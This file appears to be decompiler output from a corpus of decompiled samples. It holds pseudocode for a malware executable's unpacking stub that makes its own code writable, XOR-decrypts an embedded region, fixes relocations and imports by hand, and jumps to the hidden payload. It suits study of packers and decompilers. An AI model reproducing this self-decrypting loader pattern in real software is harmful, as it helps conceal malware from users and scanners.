// subject.c
// Generated on 5/4/2015 1:08:34 AM by decompiling malware_via_email/malware_0447/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

void fn00401000(word32 eax, word32 ecx, word32 edx, word32 ebx, word32 edi)
{
fn00401000_entry:
l00401000:
	call SHLWAPI.dll!StrChrA (retsize: 4; depth: 32)
	word32 esi_101 = 0x00000000
	branch eax == 0x00000000 l0040101D
l00401016:
	return
l0040101D:
	word32 eax_39 = GetProcAddress(LoadLibraryA(0x00404074), 0x0040406C)
	call eax_39 (retsize: 4; depth: 64)
	word32 ebp_304 = eax_39 + 0x0000001C
	branch AreAllAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) != 0x00000000 l0040105C
l00401059:
	ebp_304 = eax_39 + 0x0000001C ^ 0x0000000E
l0040105C:
	Mem73[fp - 0x00000040:word32] = fp - 0x0000002C
	Mem75[fp - 0x00000044:word32] = 0x00000040
	VirtualProtect(0x00401000, 0x00003000, 0xFFFFFFFF, 0xFFFFFFFF)
	word32 eax_109 = 0x00000000
l00401078:
	branch esi_101 != ebp_304 l00401081
l0040107F:
	esi_101 = 0x00000000
l00401081:
	Mem107[eax_109 + 0x004025E8:byte] = Mem75[esi_101 + 0x00405000:byte] ^ Mem75[eax_109 + 0x004025E8:byte] ^ 0xEC
	eax_109 = eax_109 + 0x00000001
	esi_101 = esi_101 + 0x00000001
	branch eax_109 <u 0x00001420 l00401078
l004010A9:
	word32 ebx_114 = 0x004038C8
	word32 ebp_117 = 0x00000000
	word32 dwLoc28_122 = 0x00000000
l004010D0:
	word32 eax_130 = Mem107[ebx_114 + 0x00000004:word32]
	word32 edx_138 = ebx_114 + 0x00000008
	branch eax_130 - 0x00000008 >>u 0x00000001 <= 0x00000000 l00401111
l004010E2:
	word32 ebp_275 = eax_130 - 0x00000008 >>u 0x00000001
l004010E4:
	branch (Mem107[edx_138 + 0x00000000:word16] & 0xF000) != 0x3000 l00401105
l004010F1:
	word32 ecx_295 = ((word32) Mem107[edx_138 + 0x00000000:word16] & 0x00000FFF) + Mem107[ebx_114 + 0x00000000:word32]
	Mem298[ecx_295 + 0x00402368:word32] = Mem107[ecx_295 + 0x00402368:word32] + 0xF0402368
l00401105:
	edx_138 = edx_138 + 0x00000002
	ebp_275 = ebp_275 - 0x00000001
	branch ebp_275 != 0x00000000 l004010E4
l0040110D:
	ebp_117 = dwLoc28_122
l00401111:
	ebp_117 = ebp_117 + Mem107[ebx_114 + 0x00000004:word32]
	dwLoc28_122 = ebp_117
	ebx_114 = ebx_114 + Mem107[ebx_114 + 0x00000004:word32]
	branch ebp_117 <u 0x000000E4 l004010D0
l00401126:
	word32 ebx_154 = 0x004030C4
	word32 dwLoc28_155 = 0x004030C4
	branch Mem107[0x004030D4:word32] == 0x00000000 l004011BC
l0040113D:
	ebx_176 = ebx_154
l00401140:
	word32 ebx_176
	word32 eax_183 = LoadLibraryA(Mem107[ebx_176 + 0x0000000C:word32] + 0x00402368)
	word32 ecx_185 = eax_183
	branch eax_183 == 0x00000000 l004011AF
l00401156:
	word32 ebp_210 = Mem107[ebx_176 + 0x00000000:word32]
	branch ebp_210 != 0x00000000 l0040115F
l0040115C:
	ebp_210 = Mem107[ebx_176 + 0x00000010:word32]
l0040115F:
	word32 eax_216 = Mem107[ebp_210 + 0x00402368:word32]
	word32 ebp_218 = ebp_210 + 0x00402368
	word32 esi_219 = Mem107[ebx_176 + 0x00000010:word32] + 0x00402368
	branch eax_216 == 0x00000000 l004011AF
l0040116E:
	goto l00401174
l00401170:
	ecx_185 = eax_183
l00401174:
	word32 eax_243
	branch eax_216 >= 0x00000000 l00401189
l00401178:
	eax_243 = GetProcAddress(ecx_185, (word32) Mem107[ebp_218 + 0x00000000:word16])
	goto l00401195
l00401189:
	eax_243 = GetProcAddress(ecx_185, eax_216 + 0x0040236A)
l00401195:
	Mem245[esi_219 + 0x00000000:word32] = eax_243
	ebp_218 = ebp_218 + 0x00000004
	eax_216 = Mem245[ebp_218 + 0x00000000:word32]
	esi_219 = esi_219 + 0x00000004
	branch eax_216 != 0x00000000 l00401170
l004011AB:
	ebx_176 = dwLoc28_155
l004011AF:
	ebx_176 = ebx_176 + 0x00000014
	dwLoc28_155 = ebx_176
	branch Mem107[ebx_176 + 0x00000010:word32] != 0x00000000 l00401140
l004011BC:
	call 0x00402DB8 (retsize: 4; depth: 64)
	ExitProcess(0x00000000)
fn00401000_exit:
}

